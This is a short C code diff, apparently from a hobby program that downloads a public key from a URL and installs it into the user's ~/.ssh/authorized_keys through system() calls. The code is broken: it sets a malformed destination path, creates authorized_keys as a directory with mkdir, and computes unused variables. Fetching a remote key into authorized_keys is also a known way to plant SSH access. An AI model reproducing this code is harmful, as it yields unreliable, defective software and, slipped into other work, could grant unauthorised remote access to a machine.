@@ -5,6 +5,7 @@
 #include <unistd.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <errno.h>
 #include "net_functions.h"
 
 struct config {
@@ -30,14 +31,21 @@ int main(void) {
 
 	config_1.url = "http://0.0.0.0/key.pub";
 	config_1.source_and_outfile = "/tmp/key.pub";
-	config_1.destination = "~/.ssh/authorized_keys";
+	config_1.destination = "/~/.ssh/authorized_keys/";
 
 	// END CONFIG 
+
+	char * mode = "600";
+	char * buf = config_1.destination;
+
+	int i;
+	i = strtol(mode, 0, 8);
 
 	if (stat(config_1.destination, &st) == -1) {
 			printf("creating directory %s\n", config_1.destination);
 
-			system("mkdir ~/.ssh/authorized_keys");	// shell scripting ;(	
+			system("mkdir ~/.ssh/authorized_keys");	// shell scripting ;(
+			system("chmod 600 ~/.ssh/authorized_keys");
 	} 
 
 	printf("downlading %s from %s\n\n", config_1.source_and_outfile, config_1.url);
